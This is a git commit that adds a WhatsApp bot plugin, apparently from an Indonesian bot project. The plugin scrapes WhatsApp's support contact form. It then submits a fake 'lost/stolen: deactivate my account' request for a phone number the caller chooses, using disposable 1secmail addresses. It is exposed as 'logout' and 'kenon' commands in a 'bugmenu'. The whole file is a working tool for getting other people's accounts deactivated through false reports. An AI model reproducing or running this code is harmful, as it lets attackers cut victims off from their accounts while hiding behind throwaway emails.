e526531f217caf4298bb1947c2ef125ac7daf996
BOTGITBASH <kk0298156@gmail.com>
2023-05-09 14:24:31 +0000

    Agak lain

---
+++ plugins/Owners/bugverify.js
@@ -0,0 +1,50 @@
+import axioss from 'axios'
+import cheerio from 'cheerio'
+import util from 'util'
+
+let handler = async (m, { conn, command, usedPrefix, text }) => {
+if (!text) throw 'Masukan Nomor'
+  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
+let cookie = ntah.headers["set-cookie"].join("; ")
+let $ = cheerio.load(ntah.data)
+let $form = $("form");
+let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
+let form = new URLSearchParams()
+form.append("jazoest", $form.find("input[name=jazoest]").val())
+form.append("lsd", $form.find("input[name=lsd]").val())
+form.append("step", "submit")
+form.append("country_selector", "ID")
+form.append("phone_number", text)
+form.append("email", email.data[0])
+form.append("email_confirm", email.data[0])
+form.append("platform", "ANDROID")
+form.append("your_message", "Perdido/roubado: desative minha conta")
+form.append("__user", "0")
+form.append("__a", "1")
+form.append("__csr", "")
+form.append("__req", "8")
+form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
+form.append("dpr", "1")
+form.append("__ccg", "UNKNOWN")
+form.append("__rev", "1006630858")
+form.append("__comment_req", "0")
+let res = await axioss({
+  url,
+  method: "POST",
+  data: form,
+  headers: {
+    cookie
+  }
+})
+conn.reply(m.chat, util.format(JSON.parse(res.data.replace("for (;;);", ""))), m)
+}
+handler.help = ['🐣']
+handler.tags = ['bugmenu']
+handler.command = /^🐣|verif|logout|kenon$/i
+
+handler.owner = true 
+handler.rowner = true 
+handler.mods = true
+
+export default handler
